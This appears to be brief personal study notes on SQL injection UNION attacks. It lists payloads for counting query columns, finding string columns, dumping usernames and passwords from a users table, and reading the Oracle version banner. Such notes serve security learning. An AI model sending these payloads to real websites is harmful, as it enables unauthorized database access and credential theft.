### Union
SQL injection UNION attack, determining the number of columns returned by the query:  
`'+UNION+SELECT+NULL--`  
keep adding nulls until the page is returned, now we know how many columns there  
Now we take the attack further by checking if certain columns contain a string:
`'union%20select%20null%2c'STRING'%2cnull--`  
As a contrived example if we determine that the first two columns contain strings, we can steal creds:  
`'union%20select%20username%2cpassword%20from%20users--`  
If we enumerate that there are two columns and only the second one contains text, we can retrieving multiple values in a single column using string concatenation eg |null|username+passord|
`'+UNION+SELECT+NULL,username||'~'||password+FROM+users--`
For oracle, remember we need to select from a table, so after determining that the DB we are attacking has two columns with text:
`'union+select+banner,null+from+v$version--`
